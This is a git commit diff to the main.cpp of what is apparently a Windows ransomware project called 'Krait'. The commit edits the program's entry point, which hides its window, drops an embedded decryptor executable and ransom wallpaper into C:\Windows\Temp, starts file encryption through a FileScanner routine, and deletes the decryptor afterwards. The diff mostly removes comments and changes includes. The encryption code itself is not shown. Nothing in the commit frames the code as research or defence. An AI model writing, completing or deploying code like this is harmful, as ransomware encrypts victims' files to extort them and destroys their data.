b6a1840f021977a0dc63ca08565615cbbd99aa63
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-22 13:35:31 +0300

    Update main.cpp

--- scr/main.cpp
+++ scr/main.cpp
@@ -1,6 +1,8 @@
 #include "file_scanner.h"
 #include <windows.h>
-#include <tchar.h>
+#include <shlobj.h>
+#include <fstream>
+#include <string>
 
 void ExtractResource(int resourceId, const std::string& outputPath) {
     HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
@@ -18,29 +20,22 @@ void ExtractResource(int resourceId, const std::string& outputPath) {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Hide window
     HWND hWnd = GetConsoleWindow();
     if (hWnd) ShowWindow(hWnd, SW_HIDE);
     
-    // Extract resources before encryption
     char desktopPath[MAX_PATH];
     SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
     std::string desktop = std::string(desktopPath);
     
-    // Extract decryptor to temp
     std::string tempExe = "C:\\Windows\\Temp\\KRAIT_DECRYPTOR.exe";
     ExtractResource(101, tempExe);
     
-    // Extract wallpaper
     std::string tempWall = "C:\\Windows\\Temp\\krait.webp";
     ExtractResource(102, tempWall);
     
-    // Start encryption
     FileScanner::StartEncryption();
     
-    // Cleanup
     DeleteFileA(tempExe.c_str());
-    // Keep wallpaper
     
     return 0;
 }
